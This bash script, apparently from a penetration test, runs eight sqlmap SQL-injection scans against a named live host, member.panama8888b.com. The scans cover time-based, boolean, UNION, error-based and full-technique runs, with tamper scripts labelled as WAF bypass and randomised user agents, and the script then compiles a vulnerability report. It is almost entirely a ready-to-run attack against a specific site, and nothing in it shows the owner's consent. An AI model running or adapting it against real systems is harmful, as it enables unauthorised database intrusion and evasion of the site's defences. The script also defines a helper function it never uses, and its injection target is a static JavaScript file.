#!/bin/bash

# Improved SQLMap Testing Script with Better Error Handling
# Team B - Panama8888b Penetration Test
# Fixed version with proper URL handling

TARGET_URL="https://member.panama8888b.com/public/js/v2/app.js?v=25.1"
OUTPUT_DIR="./sqlmap_results"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${GREEN}[+] Improved SQLMap Testing Script${NC}"
echo -e "${GREEN}[+] Target: $TARGET_URL${NC}"
echo -e "${BLUE}[+] Output Directory: $OUTPUT_DIR${NC}"
echo "=================================================="

# Function to run sqlmap test with better error handling
run_sqlmap_test() {
    local test_name="$1"
    local test_dir="$2"
    local sqlmap_args="$3"
    
    echo -e "${YELLOW}[*] $test_name${NC}"
    echo -e "${BLUE}[*] Output: $test_dir${NC}"
    
    # Create test directory
    mkdir -p "$test_dir"
    
    # Run sqlmap with provided arguments
    timeout 300 sqlmap $sqlmap_args
    
    # Check exit status
    local exit_code=$?
    if [ $exit_code -eq 0 ]; then
        echo -e "${GREEN}[+] $test_name completed successfully${NC}"
    elif [ $exit_code -eq 124 ]; then
        echo -e "${YELLOW}[!] $test_name timed out (5 minutes)${NC}"
    else
        echo -e "${RED}[!] $test_name failed or was interrupted (exit code: $exit_code)${NC}"
    fi
    
    echo "----------------------------------------"
    sleep 1
}

# Test 1: Basic detection
echo -e "${YELLOW}[*] Test 1: Basic SQL injection detection${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test1${NC}"
sqlmap -u "$TARGET_URL" \
    --batch \
    --level=1 \
    --risk=1 \
    --random-agent \
    --delay=1 \
    --timeout=10 \
    --output-dir="$OUTPUT_DIR/test1"
echo "----------------------------------------"

# Test 2: Time-based injection
echo -e "${YELLOW}[*] Test 2: Time-based injection${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test2${NC}"
sqlmap -u "$TARGET_URL" \
    --batch \
    --technique=T \
    --time-sec=3 \
    --dbms=mssql \
    --random-agent \
    --delay=2 \
    --output-dir="$OUTPUT_DIR/test2"
echo "----------------------------------------"

# Test 3: Boolean-based blind injection
echo -e "${YELLOW}[*] Test 3: Boolean-based blind injection${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test3${NC}"
sqlmap -u "$TARGET_URL" \
    --batch \
    --technique=B \
    --dbms=mssql \
    --random-agent \
    --delay=1 \
    --output-dir="$OUTPUT_DIR/test3"
echo "----------------------------------------"

# Test 4: UNION-based injection
echo -e "${YELLOW}[*] Test 4: UNION-based injection${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test4${NC}"
sqlmap -u "$TARGET_URL" \
    --batch \
    --technique=U \
    --union-cols=1-3 \
    --dbms=mssql \
    --random-agent \
    --delay=1 \
    --output-dir="$OUTPUT_DIR/test4"
echo "----------------------------------------"

# Test 5: Error-based injection
echo -e "${YELLOW}[*] Test 5: Error-based injection${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test5${NC}"
sqlmap -u "$TARGET_URL" \
    --batch \
    --technique=E \
    --dbms=mssql \
    --random-agent \
    --delay=1 \
    --output-dir="$OUTPUT_DIR/test5"
echo "----------------------------------------"

# Test 6: With tamper scripts
echo -e "${YELLOW}[*] Test 6: WAF bypass with tamper scripts${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test6${NC}"
sqlmap -u "$TARGET_URL" \
    --batch \
    --level=3 \
    --risk=2 \
    --tamper=space2comment \
    --random-agent \
    --delay=2 \
    --output-dir="$OUTPUT_DIR/test6"
echo "----------------------------------------"

# Test 7: Custom injection point
echo -e "${YELLOW}[*] Test 7: Custom injection point with marker${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test7${NC}"
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1*" \
    --batch \
    --level=2 \
    --risk=2 \
    --dbms=mssql \
    --random-agent \
    --delay=1 \
    --output-dir="$OUTPUT_DIR/test7"
echo "----------------------------------------"

# Test 8: Comprehensive test
echo -e "${YELLOW}[*] Test 8: Comprehensive test with all techniques${NC}"
echo -e "${BLUE}[*] Output: $OUTPUT_DIR/test8${NC}"
sqlmap -u "$TARGET_URL" \
    --batch \
    --level=5 \
    --risk=3 \
    --technique=BEUSTQ \
    --dbms=mssql \
    --tamper=space2comment,charencode \
    --random-agent \
    --delay=3 \
    --timeout=15 \
    --output-dir="$OUTPUT_DIR/test8"
echo "----------------------------------------"

# Generate comprehensive summary report
echo -e "${GREEN}[+] Generating comprehensive summary report...${NC}"
echo "=================================================="

# Create summary report
cat > "$OUTPUT_DIR/comprehensive_report.txt" << EOF
SQLMap Comprehensive Test Report
Generated: $(date)
Target: $TARGET_URL
==================================================

EOF

# Check each test directory for results
for test_dir in "$OUTPUT_DIR"/test*; do
    if [ -d "$test_dir" ]; then
        test_name=$(basename "$test_dir")
        echo "=== $test_name ===" >> "$OUTPUT_DIR/comprehensive_report.txt"
        
        # Check for log files
        if [ -f "$test_dir/log" ]; then
            echo "Log file: EXISTS" >> "$OUTPUT_DIR/comprehensive_report.txt"
            
            # Check for vulnerabilities
            if grep -q "injectable" "$test_dir/log"; then
                echo "STATUS: VULNERABILITY DETECTED!" >> "$OUTPUT_DIR/comprehensive_report.txt"
                echo -e "${RED}[!] VULNERABILITY FOUND in $test_name${NC}"
                
                # Extract vulnerability details
                echo "Details:" >> "$OUTPUT_DIR/comprehensive_report.txt"
                grep -A 5 -B 5 "injectable" "$test_dir/log" >> "$OUTPUT_DIR/comprehensive_report.txt"
            else
                echo "STATUS: No vulnerability detected" >> "$OUTPUT_DIR/comprehensive_report.txt"
            fi
            
            # Check for errors
            if grep -q "CRITICAL\|ERROR\|WARNING" "$test_dir/log"; then
                echo "Issues found:" >> "$OUTPUT_DIR/comprehensive_report.txt"
                grep "CRITICAL\|ERROR\|WARNING" "$test_dir/log" | head -3 >> "$OUTPUT_DIR/comprehensive_report.txt"
            fi
        else
            echo "Log file: NOT FOUND" >> "$OUTPUT_DIR/comprehensive_report.txt"
            echo "STATUS: Test may have failed" >> "$OUTPUT_DIR/comprehensive_report.txt"
        fi
        
        echo "" >> "$OUTPUT_DIR/comprehensive_report.txt"
    fi
done

# Add final summary
echo "==================================================" >> "$OUTPUT_DIR/comprehensive_report.txt"
echo "FINAL SUMMARY:" >> "$OUTPUT_DIR/comprehensive_report.txt"

# Count vulnerabilities
vuln_count=$(grep -r "injectable" "$OUTPUT_DIR"/*/log 2>/dev/null | wc -l)
echo "Total vulnerabilities found: $vuln_count" >> "$OUTPUT_DIR/comprehensive_report.txt"

# Count successful tests
success_count=$(find "$OUTPUT_DIR" -name "log" -exec grep -l "injectable\|completed\|finished" {} \; 2>/dev/null | wc -l)
echo "Successful tests: $success_count" >> "$OUTPUT_DIR/comprehensive_report.txt"

echo -e "${GREEN}[+] All tests completed!${NC}"
echo -e "${BLUE}[+] Check results in: $OUTPUT_DIR${NC}"
echo -e "${BLUE}[+] Comprehensive report: $OUTPUT_DIR/comprehensive_report.txt${NC}"
echo "=================================================="

# Display summary
echo -e "${YELLOW}[*] Quick Summary:${NC}"
cat "$OUTPUT_DIR/comprehensive_report.txt"